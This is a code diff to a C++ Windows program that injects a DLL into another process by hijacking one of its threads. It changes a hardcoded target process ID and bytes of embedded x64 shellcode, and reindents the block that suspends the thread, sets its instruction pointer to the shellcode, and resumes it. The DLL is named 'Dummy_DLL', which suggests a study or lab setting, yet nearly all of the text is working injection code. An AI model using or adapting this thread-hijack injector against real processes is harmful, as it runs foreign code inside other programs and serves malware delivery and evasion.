@@ -4,7 +4,7 @@
 
 #pragma comment(lib, "onecore.lib")
 
-DWORD ProcessID = 12748;
+DWORD ProcessID = 20692;
 const char *DllName = "C:\\dev\\Dummy_DLL\\x64\\Release\\Dummy_DLL.dll";
 const char *ModName = "KERNEL32.DLL";
 
@@ -44,8 +44,8 @@ int main() {
     back to the original RIP location
   */
   const char *MyShellCode =
-      "\x48\x83\xEC\x28\x48\x8D\x0D\xC5\xFF\xFF\xFF\x48\xBA\x30\x08\x55\xA0\xF9"
-      "\x7F\x00\x00\xFF\xD2\x48\x83\xC4\x28\xE9\xB4\x10\x1E\xFE";
+      "\x48\x83\xEC\x28\x48\x8D\x0D\xC5\xFF\xFF\xFF\x48\xBA\x30\x08\xCC\xB1\xFC"
+      "\x7F\x00\x00\xFF\xD2\x48\x83\xC4\x28\xE9\xB4\x10\xB5\x0F";
 
   printf("[+] Copying Shellcode into Target\n\n");
 
@@ -56,46 +56,46 @@ int main() {
   /*
     Hijack the thread
   */
-  HANDLE hThread = Inject::GetThreadFromProcess(ProcessID);
+   HANDLE hThread = Inject::GetThreadFromProcess(ProcessID);
 
-  if (hThread == INVALID_HANDLE_VALUE)
-    return 0;
+   if (hThread == INVALID_HANDLE_VALUE)
+     return 0;
 
-  CONTEXT ctx = {};
-  ctx.ContextFlags = CONTEXT_FULL;
+   CONTEXT ctx = {};
+   ctx.ContextFlags = CONTEXT_FULL;
 
-  printf("[+] Suspending Thread\n\n");
+   printf("[+] Suspending Thread\n\n");
 
-  SuspendThread(hThread);
+   SuspendThread(hThread);
 
-  GetThreadContext(hThread, &ctx);
+   GetThreadContext(hThread, &ctx);
 
-  printf("[+] Original RIP: %llX\n\n", (uintptr_t)ctx.Rip);
+   printf("[+] Original RIP: %llX\n\n", (uintptr_t)ctx.Rip);
 
-  ctx.Rip = ((uintptr_t)MyBufferSpace + 48);
+   ctx.Rip = ((uintptr_t)MyBufferSpace + 48);
 
-  printf("[+] New RIP: %llX\n\n", (uintptr_t)ctx.Rip);
+   printf("[+] New RIP: %llX\n\n", (uintptr_t)ctx.Rip);
 
-  if (!SetThreadContext(hThread, &ctx)) {
-    printf("Unable to SetThreadContext\n");
-    return 1;
-  }
+   if (!SetThreadContext(hThread, &ctx)) {
+     printf("Unable to SetThreadContext\n");
+     return 1;
+   }
 
-  GetThreadContext(hThread, &ctx);
+   GetThreadContext(hThread, &ctx);
 
-  printf("[+] Confirmed New RIP: %llX\n\n", (uintptr_t)ctx.Rip);
+   printf("[+] Confirmed New RIP: %llX\n\n", (uintptr_t)ctx.Rip);
 
-  printf("[+] Resuming Thread\n\n");
+   printf("[+] Resuming Thread\n\n");
 
-  ResumeThread(hThread);
+   ResumeThread(hThread);
 
-  printf("[+] Cleaning Up\n\n");
+   printf("[+] Cleaning Up\n\n");
 
-  CloseHandle(hThread);
+   CloseHandle(hThread);
 
-  CloseHandle(hProcess);
+   CloseHandle(hProcess);
 
-  printf("[+] Successfully Hijacked Thread and Injected DLL.\n\n");
+   printf("[+] Successfully Hijacked Thread and Injected DLL.\n\n");
 
   return 1;
 }
